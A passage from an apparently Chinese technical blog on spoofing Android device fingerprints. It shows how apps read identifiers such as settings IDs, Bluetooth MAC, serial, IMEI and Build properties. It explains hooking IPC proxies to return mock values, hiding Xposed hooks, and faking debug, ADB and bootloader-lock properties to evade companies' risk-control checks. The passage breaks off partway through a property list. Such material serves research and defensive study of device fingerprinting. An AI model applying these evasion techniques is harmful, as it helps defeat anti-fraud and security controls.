class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Settings.Global.getString(context.getContentResolver(),&quot;mi_health_id&quot;)</span><br><span class="line">Settings.Global.getString(context.getContentResolver(),&quot;mi_health_id&quot;)</span><br><span class="line">Settings.Global.getString(context.getContentResolver(),&quot;gcbooster_uuid&quot;)</span><br><span class="line">Settings.Global.getString(context.getContentResolver(),&quot;key_mqs_uuid&quot;)</span><br><span class="line">Settings.Global.getString(context.getContentResolver(),&quot;ad_aaid&quot;)</span><br></pre></td></tr></table></figure><h5 id="Mock"><a href="#Mock" class="headerlink" title="Mock:"></a>Mock:</h5><p><strong>方法Hook</strong></p><p><code>Global</code>和<code>Secure</code> 都是实现的<code>NameValueTable</code>接口。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public static String getString(ContentResolver resolver, String name) &#123;</span><br><span class="line">      return getStringForUser(resolver, name, resolver.getUserId());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>底层调用的是<code>getStringForUser(resolver, name, resolver.getUserId())</code> 三个参数，如果Hook的话可以对这个方法进行入手</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Settings.Secure-&gt;getStringForUser &amp; Settings.Global-&gt;getStringForUser</span><br></pre></td></tr></table></figure><p><strong>内存反射</strong></p><p>很多开发者会采用内存反射的方式去获取变量，所以仅仅是通过<code>mock</code>方法的方式不够，如果进行Mock需要将<code>Settings.Secure</code> 和 <code>Settings.Global</code> 里面的内存变量进行修复，<code>Settings.Global</code>是放了一些全局变量，<code>Settings.Secure</code>放一些安全相关</p><p><code>Settings.Secure-&gt;getStringForUser Settings.Global-&gt;getStringForUser</code> 和 具体方法如下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">private static final HashSet&lt;String&gt; MOVED_TO_GLOBAL;</span><br><span class="line">private static final NameValueCache sNameValueCache = new NameValueCache(</span><br><span class="line">                CONTENT_URI,</span><br><span class="line">                CALL_METHOD_GET_SYSTEM,</span><br><span class="line">                CALL_METHOD_PUT_SYSTEM,</span><br><span class="line">                sProviderHolder,</span><br><span class="line">                System.class);</span><br><span class="line">                 </span><br><span class="line">public static String getStringForUser(ContentResolver resolver, String name,</span><br><span class="line">                int userHandle) &#123;</span><br><span class="line">            if (MOVED_TO_GLOBAL.contains(name)) &#123;</span><br><span class="line">                Log.w(TAG, &quot;Setting &quot; + name + &quot; has moved from android.provider.Settings.Secure&quot;</span><br><span class="line">                        + &quot; to android.provider.Settings.Global.&quot;);</span><br><span class="line">                return Global.getStringForUser(resolver, name, userHandle);</span><br><span class="line">            &#125;</span><br><span class="line">            ...</span><br><span class="line">            return sNameValueCache.getStringForUser(resolver, name, userHandle);</span><br><span class="line">       &#125;</span><br><span class="line">                 </span><br><span class="line">                 </span><br><span class="line">@UnsupportedAppUsage</span><br><span class="line">public static String getStringForUser(ContentResolver resolver, String name,</span><br><span class="line">                int userHandle) &#123;</span><br><span class="line">            if (MOVED_TO_SECURE.contains(name)) &#123;</span><br><span class="line">                Log.w(TAG, &quot;Setting &quot; + name + &quot; has moved from android.provider.Settings.System&quot;</span><br><span class="line">                        + &quot; to android.provider.Settings.Secure, returning read-only value.&quot;);</span><br><span class="line">                return Secure.getStringForUser(resolver, name, userHandle);</span><br><span class="line">            &#125;</span><br><span class="line">            if (MOVED_TO_GLOBAL.contains(name) || MOVED_TO_SECURE_THEN_GLOBAL.contains(name)) &#123;</span><br><span class="line">                Log.w(TAG, &quot;Setting &quot; + name + &quot; has moved from android.provider.Settings.System&quot;</span><br><span class="line">                        + &quot; to android.provider.Settings.Global, returning read-only value.&quot;);</span><br><span class="line">                return Global.getStringForUser(resolver, name, userHandle);</span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，<strong>整体的cache都是放在sNameValueCache变量和MOVED_TO_GLOBAL变量内部进行存储 。</strong></p><p>我们可以直接反射<code>MOVED_TO_GLOBAL</code>这个<code>HashSet</code>或者去<code>sNameValueCache</code> 这个变量然后去获取这个值的话，也是很容易可以拿到最真实的值的。所以光<code>mock</code>是不够的。</p><p>比如很多大厂就是<strong>Android高版本绕过了反射限制以后，或者判断当前手机没有API反射限制以后直接通过反射变量的方式去获取。</strong></p><p><code>sNameValueCache</code>在高版本是一个对象，低版本安卓他是一个<code>ArrayMap</code> 这块需要注意。</p><p><code>sNameValueCache</code>修改的话可以调用<code>API putStringForUser</code>  往里面强制赋值。这么一来下次对方在通过<code>API</code>去调用的时候就会拿到你已经进行过<code>Mock</code>的值。所以你修改的时候需要进行判断，当前获取的值是否是你已经<code>Mock</code>过的。</p><h4 id="蓝牙网卡MAC（普通）"><a href="#蓝牙网卡MAC（普通）" class="headerlink" title="蓝牙网卡MAC（普通）"></a>蓝牙网卡MAC（普通）</h4><p>蓝牙的网卡不是普通的网卡，后面会介绍netlinker获取真实的网卡。</p><h5 id="Get-1"><a href="#Get-1" class="headerlink" title="Get:"></a>Get:</h5><p>主要方法就是通过BluetoothAdapter-&gt;getAddress</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">getAddress</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> mManagerService.getAddress(mAttributionSource);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">        Log.e(TAG, <span class="string">&quot;&quot;</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line">应用进程 → Binder Proxy → Binder 驱动 → Binder Stub → system_server (实际服务)</span><br></pre></td></tr></table></figure><h5 id="Mock："><a href="#Mock：" class="headerlink" title="Mock："></a>Mock：</h5><p>可以看到这个方法主要是通过<code>IPC</code>的代理类方式去获取的。<strong>所以Hook的话尽可能先Hook代理的IPC类。先尝试反射 android.bluetooth.IBluetooth$Stub$Proxy然后Hook IPC里面的getAddress 而不是直接HookBluetoothAdapter-&gt;getAddress</strong></p><p>因为很多大厂获取设备的指纹的时候会检测这个方法是否被Hook，检测也很简单，只需要获取这个<code>artmethod</code>结构体以后</p><p>判断这个方法入口是否被替换，比如Sandhook之类的常用的Hook框架，低版本采用的是inlinehook形式，在高版本里面采用的是入口替换，可以直接获取到方法的入口的函数地址，判断一下函数所在的so即可。所以尽可能HookIPC的方法。<strong>如果用XPosed去修改的话，还需要注意魔改，否则大厂会通过XposedHelpers-&gt;sHookedMethodCallbacks变量把你Hook的方法进行上报</strong>。</p><blockquote><p>小技巧：这个变量是一个静态变量，所以我们只需要拿到XposedHelpers这个class即可。想要拿到class必须先拿到这个类的classloader，正常的Xposed是通过系统的classloader作为父类classloader，但是edxp这种，是一个方法内部的成员变量，没有任何地方引用这个classloader，所以想拿到这个classloader需要用到内存漫游。把内存全部的classloader都从内存抠出来，然后挨个去反射获取XposedHelpers 即可。</p></blockquote><p><code>sHookedMethodCallbacks</code>里面保存了XPosed全部的Hook方法信息，用于石锤当前方法是否被Hook。获取被Hook方法具体如下：</p><blockquote><p><strong>XposedHelpers-&gt;methodCache 不建议使用，如果攻击者使用了XposedBridge-&gt;HookAllmethod 的话，可能会导致Hook方法上报的遗漏。</strong></p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">private void getHookItemDemo() &#123;</span><br><span class="line">    ArrayList&lt;Object&gt; choose = ChooseUtils.choose(ClassLoader.class, true);</span><br><span class="line">    for(Object obj :choose)&#123;</span><br><span class="line">        ClassLoader clazzloader = (ClassLoader) obj;</span><br><span class="line">        Class&lt;?&gt; clazzXh = null;</span><br><span class="line">        Class&lt;?&gt; clazzBR = null;</span><br><span class="line">        try &#123;</span><br><span class="line">            Log.e(&quot;Test&quot;, &quot;-----------------------------------------------------------------&quot;);</span><br><span class="line"></span><br><span class="line">            clazzBR =  Class.forName(&quot;de.robv.android.xposed.XposedBridge&quot;,false,clazzloader);</span><br><span class="line">            Field callbacksField = clazzBR.getDeclaredField(&quot;sHookedMethodCallbacks&quot;);</span><br><span class="line">            callbacksField.setAccessible(true);</span><br><span class="line">            Map&lt;Member, Object&gt; callback = (Map&lt;Member, Object&gt;) callbacksField.get(null);</span><br><span class="line"></span><br><span class="line">            for(Member key :callback.keySet()) &#123;</span><br><span class="line">                Log.e(&quot;Test&quot;, &quot;sHookedMethodCallbacks  &quot; + key.toString());</span><br><span class="line">            &#125;</span><br><span class="line">            Log.e(&quot;Test&quot;, &quot;-----------------------------------------------------------------&quot;);</span><br><span class="line"></span><br><span class="line">            return;</span><br><span class="line">        &#125; catch (Throwable e) &#123;</span><br><span class="line">            Log.e(&quot;Test&quot;,&quot;find errror &quot;+e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>因为正常的使用zygisk的Xposed hook的classloader如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">┌─────────────────────────────────────────────┐</span><br><span class="line">│         BootClassLoader (系统类)             │</span><br><span class="line">│    (String, Object, Activity...)            │</span><br><span class="line">└──────────────────┬──────────────────────────┘</span><br><span class="line">                │ parent</span><br><span class="line">┌──────────────────▼──────────────────────────┐</span><br><span class="line">│      PathClassLoader (系统 Framework)        │</span><br><span class="line">│  ✅ XposedBridge.jar 被注入到这里              │</span><br><span class="line">│  ✅ 所有 App 共享这个 ClassLoader              │</span><br><span class="line">└──────────────────┬──────────────────────────┘</span><br><span class="line">                │ parent</span><br><span class="line">     ┏━━━━━━━━━━┻━━━━━━━━━━┓</span><br><span class="line">     ▼                      ▼</span><br><span class="line">┌────────────────┐    ┌────────────────┐</span><br><span class="line">│   App1 的       │    │   App2 的       │</span><br><span class="line">│  ClassLoader   │    │  ClassLoader   │</span><br><span class="line">└────────────────┘    └────────────────┘</span><br></pre></td></tr></table></figure><p>而使用riru的<code>EdXposed</code> 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">┌─────────────────────────────────────────────┐</span><br><span class="line">│         BootClassLoader                     │</span><br><span class="line">└──────────────────┬──────────────────────────┘</span><br><span class="line">                │</span><br><span class="line">┌──────────────────▼──────────────────────────┐</span><br><span class="line">│      系统 PathClassLoader                    │</span><br><span class="line">│  ❌ 没有 XposedBridge（隐蔽性）               │</span><br><span class="line">└──────────────────┬──────────────────────────┘</span><br><span class="line">                │</span><br><span class="line">     ┏━━━━━━━━━━╋━━━━━━━━━━┓</span><br><span class="line">     ▼          ▼          ▼</span><br><span class="line">┌────────────┐ ┌──────────────────┐ ┌────────────┐</span><br><span class="line">│  App 的     │ │ 🔒 隐藏的独立     │ │  其他...   │</span><br><span class="line">│ ClassLoader│ │   ClassLoader    │ └────────────┘</span><br><span class="line">└────────────┘ │ XposedBridge.jar │</span><br><span class="line">            │  加载在这里        │</span><br><span class="line">            │ ❗ 没有任何地方    │</span><br><span class="line">            │    引用它！        │</span><br><span class="line">            └──────────────────┘</span><br></pre></td></tr></table></figure><p>没有任何的App加载了相应的<code>ClassLoader</code>，因此需要通过内存漫游的方式获取所有的<code>ClassLoader</code>，然后再加载相应的类</p></blockquote><h4 id="serial（普通）"><a href="#serial（普通）" class="headerlink" title="serial（普通）"></a>serial（普通）</h4><p>这个变量在高版本里面基本已经拿不到，及时拿到了也是一个unknow，但是也需要兼容低版本的Android</p><h5 id="get"><a href="#get" class="headerlink" title="get:"></a>get:</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.O) &#123; </span><br><span class="line">        <span class="keyword">return</span> Build.getSerial();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="Mock-1"><a href="#Mock-1" class="headerlink" title="Mock:"></a>Mock:</h5><p>如果返回的不是空，并且不是 <code>unknow</code> 或者<code>UNKNOWN</code>，随机一份原始长度的字符串即可。另外该字段同上，也可以直接对<code>IPC</code>类进行处理，直接<code>Hook IPC</code>对象<code>getSerialForPackage</code> 方法即可 ，实现方法具体如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getSerial</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">IDeviceIdentifiersPolicyService</span> <span class="variable">service</span> <span class="operator">=</span> IDeviceIdentifiersPolicyService.Stub</span><br><span class="line">            .asInterface(ServiceManager.getService(Context.DEVICE_IDENTIFIERS_SERVICE));</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Application</span> <span class="variable">application</span> <span class="operator">=</span> ActivityThread.currentApplication();</span><br><span class="line">        <span class="type">String</span> <span class="variable">callingPackage</span> <span class="operator">=</span> application != <span class="literal">null</span> ? application.getPackageName() : <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">return</span> service.getSerialForPackage(callingPackage, <span class="literal">null</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">        e.rethrowFromSystemServer();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> UNKNOWN;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="IMEI-IMSI-ICCID-Line1Number-普通"><a href="#IMEI-IMSI-ICCID-Line1Number-普通" class="headerlink" title="IMEI , IMSI ,ICCID,Line1Number (普通)"></a>IMEI , IMSI ,ICCID,Line1Number (普通)</h4><h5 id="get："><a href="#get：" class="headerlink" title="get："></a>get：</h5><ul><li><p><code>IMEI</code> 与你的手机是绑定关系 用于区别移动终端设备，<code>DeviceId</code>就是IMEI</p></li><li><p><code>IMSI</code> 与你的手机卡是绑定关系 用于区别移动用户的有效信息 IMSI是用户的标识。</p></li><li><p><code>ICCID</code>是卡的标识，由20位数字组成</p></li><li><p><code>ICCID</code>只是用来<strong>区别SIM卡</strong>，<strong>不作接入网络的鉴权认证</strong>。而IMSI在接入网络的时候，会到运营商的服务器中进行验证。<code>SimSerialNumber</code>就是ICCID</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Return the phone status.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;Must hold &#123;<span class="doctag">@code</span> &lt;uses-permission android:name=&quot;android.permission.READ_PHONE_STATE&quot; /&gt;&#125;&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * IMEI 与你的手机是绑定关系 用于区别移动终端设备</span></span><br><span class="line"><span class="comment"> * IMSI 与你的手机卡是绑定关系 用于区别移动用户的有效信息 IMSI是用户的标识。</span></span><br><span class="line"><span class="comment"> * DeviceId就是IMEI</span></span><br><span class="line"><span class="comment"> * DeviceId = 99000311726612&lt;br&gt;</span></span><br><span class="line"><span class="comment"> * DeviceSoftwareVersion = 00&lt;br&gt;</span></span><br><span class="line"><span class="comment"> * Line1Number =&lt;br&gt;</span></span><br><span class="line"><span class="comment"> * NetworkCountryIso = cn&lt;br&gt;</span></span><br><span class="line"><span class="comment"> * NetworkOperator = 46003&lt;br&gt;</span></span><br><span class="line"><span class="comment"> * NetworkOperatorName = 中国电信&lt;br&gt;</span></span><br><span class="line"><span class="comment"> * NetworkType = 6&lt;br&gt;</span></span><br><span class="line"><span class="comment"> * PhoneType = 2&lt;br&gt;</span></span><br><span class="line"><span class="comment"> * SimCountryIso = cn&lt;br&gt;</span></span><br><span class="line"><span class="comment"> * SimOperator = 46003&lt;br&gt;</span></span><br><span class="line"><span class="comment"> * SimOperatorName = 中国电信&lt;br&gt;</span></span><br><span class="line"><span class="comment"> * ICCID ICCID是卡的标识，由20位数字组成</span></span><br><span class="line"><span class="comment"> * ICCID只是用来区别SIM卡，不作接入网络的鉴权认证。而IMSI在接入网络的时候，会到运营商的服务器中进行验证。</span></span><br><span class="line"><span class="comment"> * SimSerialNumber就是ICCID</span></span><br><span class="line"><span class="comment"> * SimSerialNumber = 89860315045710604022&lt;br&gt;</span></span><br><span class="line"><span class="comment"> * SimState = 5&lt;br&gt;</span></span><br><span class="line"><span class="comment"> * SubscriberId(IMSI) = 460030419724900&lt;br&gt;</span></span><br><span class="line"><span class="comment"> * VoiceMailNumber = *86&lt;br&gt;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@SuppressLint(&quot;HardwareIds&quot;)</span></span><br><span class="line"><span class="meta">@RequiresPermission(READ_PHONE_STATE)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getPhoneStatus</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">TelephonyManager</span> <span class="variable">tm</span> <span class="operator">=</span> getTelephonyManager();</span><br><span class="line">    <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="comment">//noinspection ConstantConditions</span></span><br><span class="line">    str += <span class="string">&quot;DeviceId(IMEI) = &quot;</span> + tm.getDeviceId() + <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    str += <span class="string">&quot;DeviceSoftwareVersion = &quot;</span> + tm.getDeviceSoftwareVersion() + <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    str += <span class="string">&quot;Line1Number = &quot;</span> + tm.getLine1Number() + <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    str += <span class="string">&quot;NetworkCountryIso = &quot;</span> + tm.getNetworkCountryIso() + <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    str += <span class="string">&quot;NetworkOperator = &quot;</span> + tm.getNetworkOperator() + <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    str += <span class="string">&quot;NetworkOperatorName = &quot;</span> + tm.getNetworkOperatorName() + <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    str += <span class="string">&quot;NetworkType = &quot;</span> + tm.getNetworkType() + <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    str += <span class="string">&quot;PhoneType = &quot;</span> + tm.getPhoneType() + <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    str += <span class="string">&quot;SimCountryIso = &quot;</span> + tm.getSimCountryIso() + <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    str += <span class="string">&quot;SimOperator = &quot;</span> + tm.getSimOperator() + <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    str += <span class="string">&quot;SimOperatorName = &quot;</span> + tm.getSimOperatorName() + <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    str += <span class="string">&quot;SimSerialNumber = &quot;</span> + tm.getSimSerialNumber() + <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    str += <span class="string">&quot;SimState = &quot;</span> + tm.getSimState() + <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    str += <span class="string">&quot;SubscriberId(IMSI) = &quot;</span> + tm.getSubscriberId() + <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    str += <span class="string">&quot;VoiceMailNumber = &quot;</span> + tm.getVoiceMailNumber();</span><br><span class="line">    <span class="keyword">return</span> str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="Mock：-1"><a href="#Mock：-1" class="headerlink" title="Mock："></a>Mock：</h5><p><code>TelephonyManager</code>源码：<a href="https://github.com/aosp-mirror/platform_frameworks_base/blob/master/telephony/java/android/telephony/TelephonyManager.java">https://github.com/aosp-mirror/platform_frameworks_base/blob/master/telephony/java/android/telephony/TelephonyManager.java</a></p><p>尝试优先<code>Hook ipc</code>即可</p><h4 id="Build相关（次要）"><a href="#Build相关（次要）" class="headerlink" title="Build相关（次要）"></a>Build相关（次要）</h4><p>Build里面还是有很多有用的东西，比如手机是否开启adb ,usb接口的状态之类的。我们主要将Build里面分为两部分 。指纹相关又分为两部分，<strong>单一字段 &#x2F;复合字段</strong>。</p><ol><li>配置相关</li><li>指纹相关<ul><li>单一字段（只有一个设备信息）</li><li>复合字段（多个单一字段复合而成）</li></ul></li></ol><p>这个单独通过Java层去修改是完全不够的，底层走的是<code>system_property_get</code> 这个方法（在native指纹部分会详细介绍）。</p><p>还有要防止popen getprop 这种方法去扫描全部的Build相关参数（popen getprop 在popen相关会详细介绍，这里只介绍Java应该如何处理），这个Build相关需要重点关注，他在<strong>Android底层实现类似树状结构。也就是说很多树枝都会有相同的内容。目前所有的作用域一共有七种。</strong></p><p>举个例子，比如常见的fingerprint复合字段系列 ，就分为如下七种作用域。</p><ul><li><code>ro.build.fingerprint/</code></li><li><code>ro.build.build.fingerprint/</code></li><li><code>ro.bootimage.build.fingerprint/</code></li><li><code>ro.odm.build.fingerprint/</code></li><li><code>ro.product.build.fingerprint/</code></li><li><code>ro.system_ext.build.fingerprint/</code></li><li><code>ro.system.build.fingerprint/</code></li><li><code>ro.vendor.build.fingerprint/</code></li></ul><p>作用域分别如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">private static final String Region[] = &#123;  </span><br><span class="line">      &quot;build&quot;, &quot;bootimage&quot;, &quot;odm&quot;, &quot;product&quot;, &quot;system_ext&quot;, &quot;system&quot;, &quot;vendor&quot;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这里面的值构成顺序也都是一样，所以Hook的话也需要全部进行hook，只处理单一是没用的。因为很多大厂做采集，不会只收集一项。</p><p>会七个作用域都进行收集。</p><h5 id="配置相关："><a href="#配置相关：" class="headerlink" title="配置相关："></a>配置相关：</h5><p>常见的配置如下，这些字段其实修改不修改不重要，因为很多大厂如果手机开了开发者选项或者debug模式之类的。</p><p><strong>会增加当前手机的风险值。</strong>所以尝试进行Mock 和修改 。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">PUT_MOCK_AND_SAVE_ORG(&quot;sys.usb.config&quot;, &quot;none&quot;, null, true);</span><br><span class="line">PUT_MOCK_AND_SAVE_ORG(&quot;sys.usb.state&quot;, &quot;none&quot;, null, true);</span><br><span class="line">PUT_MOCK_AND_SAVE_ORG(&quot;persist.sys.usb.config&quot;, &quot;none&quot;, null, true);</span><br><span class="line">PUT_MOCK_AND_SAVE_ORG(&quot;persist.sys.usb.qmmi.func&quot;, &quot;none&quot;, null, true);</span><br><span class="line">//这两个config可能会拿不到,拿不到则不进行mock</span><br><span class="line">PUT_MOCK_AND_SAVE_ORG(&quot;vendor.usb.mimode&quot;, &quot;none&quot;, null, true);</span><br><span class="line">PUT_MOCK_AND_SAVE_ORG(&quot;persist.vendor.usb.config&quot;, &quot;none&quot;, null, true);</span><br><span class="line">PUT_MOCK_AND_SAVE_ORG(&quot;ro.debuggable&quot;, &quot;0&quot;, null, true);</span><br><span class="line">PUT_MOCK_AND_SAVE_ORG(&quot;init.svc.adbd&quot;, &quot;stopped&quot;, null, true);</span><br><span class="line">PUT_MOCK_AND_SAVE_ORG(&quot;ro.secure&quot;, &quot;1&quot;, null, true);</span><br><span class="line">//手机解锁状态</span><br><span class="line">PUT_MOCK_AND_SAVE_ORG(&quot;ro.boot.flash.locked&quot;, &quot;1&quot;, null, true);</span><br><span class="line">PUT_MOCK_AND_SAVE_ORG(&quot;sys.oem_unlock_allowed&quot;, &quot;1&quot;, null, true);</span><br></pre></td></tr></table></figure><h5 id="单一字段"><a href="#单一字段" class="headerlink" title="单一字段:"></a>单一字段:</h5><p>在不修改机型的前提下，下面这些应该都是需要处理的 。大厂扫描频率很高的Build参数 ，随机的话，在原有的基础上开头或者结尾，随机几位数即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">ro.build.id org-&gt; [RKQ1.200826.002] mock -&gt; [RKQ1.200826.945]</span><br><span class="line">ro.build.build.id org-&gt; [RKQ1.200826.002] mock -&gt; [RKQ1.200826.945]</span><br><span class="line">ro.bootimage.build.id org-&gt; [RKQ1.200826.002] mock -&gt; [RKQ1.200826.945]</span><br><span class="line">ro.odm.build.id org-&gt; [RKQ1.200826.002] mock -&gt; [RKQ1.200826.945]</span><br><span class="line">ro.product.build.id org-&gt; [RKQ1.200826.002] mock 